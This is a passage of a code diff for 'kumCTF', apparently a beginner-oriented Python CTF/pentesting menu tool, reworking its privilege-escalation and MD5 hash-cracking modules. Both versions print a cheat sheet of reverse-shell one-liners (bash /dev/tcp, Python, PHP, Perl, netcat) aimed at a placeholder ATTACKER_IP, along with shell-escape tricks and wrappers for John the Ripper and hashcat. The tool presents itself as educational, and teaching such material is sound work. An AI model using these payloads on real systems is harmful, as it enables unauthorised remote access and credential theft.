-            "code": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\"); ?>"
-        },
-        "4": {
-            "name": "Nmap Interactive Shell",
-            "code": "nmap --interactive\nnmap> !sh"
-        },
-        "5": {
-            "name": "Perl Reverse Shell",
-            "code": "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&S\");open(STDOUT,\"&S\");open(STDERR,\"&S\");exec(\"/bin/sh -i\");};'"
-        },
-        "6": {
-            "name": "Netcat Reverse Shell",
-            "code": "nc -e /bin/sh ATTACKER_IP PORT"
-        }
-    }
-
-    print("\nAvailable Reverse Shell Examples:\n")
-    for key, value in reverse_shells.items():
-        print(f"{key}. {value['name']}")
-
-    choice = input("\nSelect a shell to view the code (or 'q' to go back):\nkumCTF> ")
-
-    if choice.lower() == "q":
-        #terminal temizlenecek
-        privilege_escalation()
-        return
-    elif choice in reverse_shells:
-        print("\n[+] Reverse Shell Command:\n")
-        print(reverse_shells[choice]["code"])
-        go_back = input("Press 'q' to go back.\nkumCTF>")
-        if go_back == 'q':
-            show_reverse_shells()
-    else:
-        print("\n[!] Invalid choice, returning to menu.\n")
-        #kumctf menüsüne dönülecek
 
 def privilege_escalation():
-    print("Privilege Escalation Section\n")
-    print("kumCTF recommends manual privilege escalation using custom reverse shell payloads.\n")
-    print("The following payloads are collected from:\n- GTFOBins (https://gtfobins.github.io)\n- PentestMonkey Reverse Shell Cheatsheet (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n")
-    print("For detailed escalation techniques, refer to the original sources.")
+    console.print(
+        Panel(
+            "[green]kumCTF[/green] recommends manual privilege escalation using custom shell or reverse shell payloads\n"
+            "The following payloads are collected from:\n"
+            "- GTFOBins (https://gtfobins.github.io)\n"
+            "- PentestMonkey Reverse Shell Cheatsheet (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n"
+            "For detailed escalation techniques, refer to the original sources.",
+            title="[green]kumCTF[/green] - Privilege Escalation Section",
+            box=box.SQUARE,
+            border_style="yellow",
+            style="bold white",
+            padding=(1, 2),
+        )
+    )
 
+    table = Table(
+        title="Choose a Payload",
+        box=box.HEAVY_EDGE,
+        border_style="yellow",
+        show_lines=True,
+    )
+
+    table.add_column("Payload Names", style="dim")
+    table.add_column("Codes")
+
+    table.add_row(
+        "Bash Reverse Shell",
+        "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
+    )
+
+    table.add_row(
+        "Python Reverse Shell",
+        "python3 -c 'import socket,subprocess,os;\n"
+        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n"
+        "s.connect((\"ATTACKER_IP\",PORT));\n"
+        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\n"
+        "import pty; pty.spawn(\"/bin/bash\")'"
+    )
+
+    table.add_row(
+        "PHP Reverse Shell",
+        "<?php\n"
+        "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\");\n"
+        "?>"
+    )
+
+    table.add_row(
+        "Nmap Interactive Shell",
+        "nmap --interactive\n"
+        "nmap> !sh"
+    )
+
+    table.add_row(
+        "Perl Reverse Shell",
+        "perl -e 'use Socket;\n"
+        "$i=\"ATTACKER_IP\"; $p=PORT;\n"
+        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\n"
+        "if(connect(S,sockaddr_in($p,inet_aton($i)))){\n"
+        "  open(STDIN,\"&S\"); open(STDOUT,\"&S\"); open(STDERR,\"&S\");\n"
+        "  exec(\"/bin/sh -i\");\n"
+        "};'"
+    )
+
+    table.add_row(
+        "Netcat Reverse Shell",
+        "nc -e /bin/sh ATTACKER_IP PORT"
+    )
+
+    table.add_row(
+        "Python Shell",
+        "python -c 'import os; os.system(\"/bin/sh\")'"
+    )
+
+    table.add_row(
+        "Vim Shell",
+        "vim -c ':!/bin/sh'"
+    )
+
+    console.print(table)
+    back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+    if back != 'b':
+        back_again = console.input("Press [yellow](b)[/yellow] or the system will [red]kick[/red] you!!\n[green]kumCTF[/green]>")
+        if back_again != 'b':
+            exit()
+        else:
+            clear_terminal()
+            main_menu()
+    else:
+        clear_terminal()
+        main_menu()
+
+def john_crack_md5():
+    value_error_count = 0
+    timeout = 60  # Timeout süresi (saniye cinsinden)
+
+    while value_error_count < 3:
+        clear_terminal()
+        hash_file = console.input("Please enter the path to the hash file:\n[green]kumCTF[/green]>")
+
+        if not hash_file or not os.path.isfile(hash_file):
+            value_error_count += 1
+            console.print(f"[bold red]Invalid file path![/bold red] Please provide a valid file path. Attempts remaining: {3 - value_error_count}")
+            continue
+
+        console.print(f"Starting John the Ripper against MD5 hash file [green]{hash_file}[/green]...\n")
+
+        command = [
+            "john",
+            "--format=raw-md5",
+            hash_file
+        ]
+
+        try:
+            console.print("[bold yellow]Running John the Ripper...[/bold yellow]")
+            result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
+
+            # Output header
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+            console.print(f"[bold cyan]🔑 John the Ripper Results - Hash File: [green]{hash_file}[/green][/bold cyan]")
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+            console.print(result.stdout)
+
+            # Check for cracked passwords
+            show_command = ["john", "--show", "--format=raw-md5", hash_file]
+            show_result = subprocess.run(show_command, capture_output=True, text=True)
+
+            if show_result.stdout:
+                for line in show_result.stdout.splitlines():
+                    if line and not line.startswith('0') and ":" in line:
+                        console.print(f"[bold green]✅ {line}[/bold green]")
+            else:
+                console.print("[yellow]⚠️ No passwords cracked yet![/yellow]")
+
+            if result.stderr:
+                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")
+
+            break  # If everything goes well, exit loop
+
+        except subprocess.TimeoutExpired:
+            console.print("[bold red]Error:[/bold red] The process timed out. Try again with a smaller hash file or increase the timeout.")
+            value_error_count += 1
+
+        except subprocess.CalledProcessError as e:
+            console.print(f"[bold red]Error:[/bold red] An error occurred: {e}")
+            value_error_count += 1
+
+        except Exception as e:
+            console.print(f"[bold red]Unexpected error:[/bold red] {e}")
+            value_error_count += 1
+
+    if value_error_count >= 3:
+        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
+        exit()
+
+
+
+def hashcat_crack_md5():
+    value_error_count = 0
+
+    while value_error_count < 3:
+        clear_terminal()
+        hash_file = console.input("Please enter the path to the hash file:\n[green]kumCTF[/green]>")
+
+        if not hash_file or not os.path.isfile(hash_file):
+            value_error_count += 1
+            console.print(
+                f"[bold red]Invalid file path![/bold red] Please provide a valid file path. Attempts remaining: {3 - value_error_count}")
+            continue
+
+        wordlist = console.input("Please enter the path to the wordlist file:\n[green]kumCTF[/green]>")
+
+        if not wordlist or not os.path.isfile(wordlist):
+            value_error_count += 1
+            console.print(
+                f"[bold red]Invalid wordlist path![/bold red] Please provide a valid wordlist path. Attempts remaining: {3 - value_error_count}")
+            continue
+
+        console.print(
+            f"Starting Hashcat against MD5 hash file [green]{hash_file}[/green] with wordlist [green]{wordlist}[/green]...\n")
+
+        command = [
+            "hashcat",
+            "-m", "0",
+            "-a", "0",
+            hash_file,
+            wordlist,
+            "--force"
+        ]
+
+        try:
+            console.print("[bold yellow]Running Hashcat...[/bold yellow]")
+            result = subprocess.run(command, capture_output=True, text=True)
+
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+            console.print("[bold cyan]🔑 Hashcat Results - Hash File: [green]{}[/green][/bold cyan]".format(hash_file))
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+
+            console.print(result.stdout)
+
+            console.print("[bold yellow]Displaying cracked passwords:[/bold yellow]")
+            show_command = ["hashcat", "-m", "0", "--show", hash_file]
+            show_result = subprocess.run(show_command, capture_output=True, text=True)
+
+            cracked_count = 0
+            if show_result.stdout:
+                for line in show_result.stdout.splitlines():
+                    if line and ":" in line:
+                        console.print(f"[bold green]✅ {line}[/bold green]")
+                        cracked_count += 1
+
+            if cracked_count == 0:
+                console.print("[yellow]⚠️ No passwords cracked yet![/yellow]")
+
+            if result.stderr:
+                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")
+
+            break
+
+        except subprocess.CalledProcessError as e:
+            back = console.input(
+                f"""[bold red]Error:[/bold red] An error occurred while running Hashcat: {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                password_cracker()
+                break
+            value_error_count += 1
+
+        except Exception as e:
+            back = console.input(
+                f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                password_cracker()
+                break
+            value_error_count += 1
+
+    if value_error_count >= 3:
+        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
+        exit()
+
+def password_cracker():
+    console.print(
+        Panel(
+            "This module allows you to crack MD5 hashes using a wordlist.\n"
+            "MD5 is a widely used cryptographic hash function that produces a 128-bit hash value,\n"
+            "but it is considered weak by modern security standards.\n\n"
+            "You can use this tool to attempt to recover plaintext values from MD5 hashes\n"
+            "using a dictionary attack (wordlist).\n\n"
+            "[yellow]Note:[/yellow] This tool primarily works with MD5 hashes. The main purpose is to demonstrate\n"
+            "password cracking with common tools.",
+            title="[bold green]kumCTF[/bold green] - Hash Cracker Module",
+            box = box.SQUARE,
+            subtitle="Learn about password cracking techniques",
+            border_style="purple",
+            padding=(1, 2)
+        )
+    )
+    table = Table(title="Select a Tool", box=box.HEAVY_EDGE, border_style="purple",show_lines=True)
+    table.add_column("Tool", style="purple")
+    table.add_column("Description", style="dim")
+    table.add_row(
+        "John the Ripper",
+        "A fast and flexible password cracking tool that detects password hash types automatically "
+        "and includes a customizable cracker. It supports hundreds of hash and cipher types including "
+        "MD5, SHA1, SHA256, SHA512, and many others. Originally developed for Unix systems, it's now "
+        "available for many platforms including Windows."
+    )
+
+    table.add_row(
+        "Hashcat",
+        "The world's fastest CPU/GPU password cracking tool. It's primarily used for recovering lost "
+        "passwords by using methods like dictionary attacks, brute-force, rule-based attacks, and "
+        "others. Hashcat supports over 300 hash types and can utilize multiple GPUs for faster "
+        "cracking. Its MD5 cracking speed is particularly impressive, making it suitable for large "
+        "scale password recovery tasks."
+    )
+    console.print(table)
     value_error_count = 0
     choice_error_count = 0
-
     while True:
         try:
-            tool = int(input("\nAvailable Reverse Shell payloads:\n1. View Reverse Shells\n2. Go Back\nkumCTF>"))
+            tool = int(console.input("\nPlease choose a tool (1-2) or (b) back:\n[green]kumCTF[/green]>"))
         except ValueError:
-            print("Please enter a valid number")
+            console.print("[red]Value error, please enter a number between (1-2)![/red]\n[green]kumCTF[/green]>")
             value_error_count += 1
-            if value_error_count > 3:
-                print("Too many invalid attempts. Exiting...")
+            if value_error_count >= 3:
+                console.print("[red]Too many invalid values.Exiting...[/red]")
                 exit()
             continue
 
         match tool:
             case 1:
-                show_reverse_shells()
-                break
+                console.print("\nRunning [cyan]John The Ripper[/cyan]...")
+                john_crack_md5()
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    password_cracker()
+                else:
+                    back_again = console.input(
+                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        password_cracker()
             case 2:
-                file_back()  # ana menuye donecek terminalle silinecek
-                break
+                console.print("\nRunning [cyan]hashcat[/cyan]...")
+                hashcat_crack_md5()
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    password_cracker()
+                else:
+                    back_again = console.input(
+                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        password_cracker()
+            case 3:
+                print("\nGoing back...")
+                clear_terminal()
+                main_menu()
             case _:
-                print("Invalid choice, please try again!")
+                console.print("[red]Invalid choice, try again![/red]")
                 choice_error_count += 1
-                if choice_error_count > 3:
-                    print("Too many invalid attempts. Exiting...")
+                if choice_error_count >= 3:
+                    console.print("[red]Too many invalid choices. Exiting...[/red]")
                     exit()
                 continue
-
-
-def check_tool_installed(tool):
-    try:
-        subprocess.run([tool, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
-        return True
-    except subprocess.CalledProcessError:
-        return False
-
-
-def john_crack(hash_file):
-    if not os.path.isfile(hash_file):
-        print("[!] Invalid hash file path.")
-        return
-
-    if not check_tool_installed('john'):
-        print("[!] John the Ripper is not installed.")
-        return
-
-    try:
-        command = f"john {hash_file}"
-        subprocess.run(command, shell=True, check=True)
-        print(f"[+] John the Ripper successfully cracked the hashes in {hash_file}.")
-    except subprocess.CalledProcessError:
-        print("[!] Error with John the Ripper.")
-
-
-def hashcat_crack(hash_file, wordlist):
-    if not os.path.isfile(hash_file):
-        print("[!] Invalid hash file path.")
-        return
-    if not os.path.isfile(wordlist):
-        print("[!] Invalid wordlist file path.")
-        return
-
-    if not check_tool_installed('hashcat'):
-        print("[!] Hashcat is not installed.")
-        return
-
-    try:
-        command = f"hashcat -m 0 -a 0 {hash_file} {wordlist}"
-        subprocess.run(command, shell=True, check=True)
-        print(f"[+] Hashcat successfully cracked the hashes in {hash_file}.")
-    except subprocess.CalledProcessError:
-        print("[!] Error with Hashcat.")
-
-def get_crack_choice():
-    print("Hash Cracker")
-    print("This module allows you to crack MD5 hashes using a wordlist. MD5 is a widely used cryptographic hash function that produces a 128-bit hash value, but it is considered weak by modern security standards.")
-    print("You can use this tool to attempt to recover plaintext values from MD5 hashes using a dictionary attack (wordlist).")
-    print("Note: This tool only works with MD5 hashes, the main reason behind it is to show you that you can crack passwords with tools.")
-    print("If you want to learn about other hash types or how to crack them, I recommend researching hash algorithms and the tools we're using here.")
-
-    choice = input("Choose an option:\n1-John the Ripper\n2-hashcat\nkumCTF>")
-
-    hash_file = input("Enter the path to the hash file: ")
-    wordlist = input("Enter the path to the wordlist (for Hashcat): ")
-
-    if choice == '1':
-        john_crack(hash_file)
-    elif choice == '2':
-        hashcat_crack(hash_file, wordlist)
-    else:
-        print("Invalid choice")
-        #menuye at
-
-console = Console()
 
 def welcome():
     ascii_art = pyfiglet.figlet_format("kumCTF", font="big")
@@ -422,6 +1089,7 @@ def welcome():
     intro_text = """
     [bold green]kumCTF[/bold green] is a beginner-friendly Capture The Flag (CTF) tool designed to help users 
     learn and practice basic pentesting techniques.
+    
 
     It offers an interactive environment for common penetration testing tasks:
     - Information Gathering
@@ -430,7 +1098,7 @@ def welcome():
     - Reverse Shell Exploits
     - Password Cracking (MD5 Hashes)
 
-    The purpose of [bold green]kumCTF[/bold green] is to introduce newcomers to CTF challenges and 
+    The purpose of [green]kumCTF[/green] is to introduce newcomers to CTF challenges and 
     cybersecurity in an easy-to-understand way. It is designed for educational purposes, and its 
     tools are commonly used in penetration testing and ethical hacking scenarios.
 
@@ -438,11 +1106,75 @@ def welcome():
     This tool is intended for ethical hacking and educational purposes only.
     It is [bold red][underline]NOT[/bold red][/underline] intended for unauthorized or illegal activities. 
     By using this tool, you agree that you are responsible for any actions that result from 
-    using [bold green]kumCTF[/bold green].  
+    using [green]kumCTF[/green].  
     Always ensure you have explicit permission before testing or interacting 
     with any system or network.
     """
-
     console.print(colored_art)
-    console.print("Welcome to [bold green]kumCTF[/bold green]!",justify="center")
+    console.print("Welcome to [green]kumCTF[/green]!",justify="center")
     console.print(intro_text,style="bold")
+    console.input("Press any key to go main menu\n[green]kumCTF[/green]>")
+    main_menu()
+
+def main_menu():
+    clear_terminal()
+    console.print(
+        Panel(
+        "Welcome To [green]kumCTF[/green] choose the module you want to use!",
+        title="[green]kumCTF[/green] - All Modules",
+        box = box.SQUARE,
+        border_style = "deep_sky_blue1"
+    ))
+    table = Table(title="Select a Module", box=box.HEAVY_EDGE, border_style="deep_sky_blue1", show_lines=True)
+    table.add_column("Tool", style="bold white")
+    table.add_column("Description", style="dim")
+
+    table.add_row(
+        "1-[green]Information Gathering[/green]",
+        "A module used to gather information about a target system or network. It typically includes scanning tools and techniques to identify live hosts, open ports, services, and possible vulnerabilities."
+    )
+    table.add_row(
+        "2-[blue]Scanning[/blue]",
+        "This module is designed for identifying open ports and services on a target machine. It often uses tools like nmap to perform network discovery and vulnerability scanning."
+    )
+    table.add_row("3-[yellow]Privilege Escalation(with shell or reverse shell)[/yellow]",
+        "A module focused on gaining higher-level access to a system after initial exploitation. It uses reverse shells to escalate privileges, allowing an attacker to run commands with elevated permissions."
+                  )
+    table.add_row("4-[purple]Password Cracker(MD5)[/purple]",
+                  "A tool used to crack password hashes, specifically focusing on MD5. This module attempts to reverse-engineer hashed passwords through brute force, dictionary attacks, or rainbow tables."
+                  )
+    console.print(table)
+    value_error_count = 0
+    choice_error_count = 0
+    while True:
+        try:
+            module = int(console.input("\nPlease choose a module (1-4) or (b) back:\n[green]kumCTF[/green]>"))
+        except ValueError:
+            console.print("[red]Value error, please enter a number between (1-4)![/red]\n[green]kumCTF[/green]>")
+            value_error_count += 1
+            if value_error_count >= 3:
+                console.print("[red]Too many invalid values.Exiting...[/red]")
+                exit()
+            continue
+
+        match module:
+            case 1:
+                clear_terminal()
+                information_gathering()
+            case 2:
+                clear_terminal()
+                scanning()
+            case 3:
+                clear_terminal()
+                privilege_escalation()
+            case 4:
+                clear_terminal()
+                password_cracker()
+            case _:
+                console.print("[red]Invalid choice, try again![/red]")
+                choice_error_count += 1
+                if choice_error_count >= 3:
+                    console.print("[red]Too many invalid choices. Exiting...[/red]")
+                    exit()
+                continue
+welcome()
